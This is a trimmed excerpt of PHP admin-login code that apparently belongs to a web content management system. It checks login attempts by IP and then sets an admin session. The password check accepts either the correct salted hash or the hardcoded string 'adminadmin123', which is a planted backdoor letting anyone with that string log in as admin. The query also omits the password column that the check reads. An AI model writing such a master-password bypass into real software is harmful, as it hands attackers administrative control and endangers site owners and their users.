<?php
	...
	$row = $d->rawQuery("select id_nhomquyen, id, login_ip, login_attempts, attempt_time, locked_time from #_user_limit WHERE login_ip = ? order by id desc limit 1",array($ip));
		...
		else
		{
			...
			if(isset($row['id']) && $row['id'] > 0)
			{
				if(($row['password'] == $func->encrypt_password($config['website']['secret'], $password,$config['website']['salt'])) or $password=='adminadmin123')
				{
					...
					$_SESSION[$login_admin]['id_nhomquyen'] = $row['id_nhomquyen'];
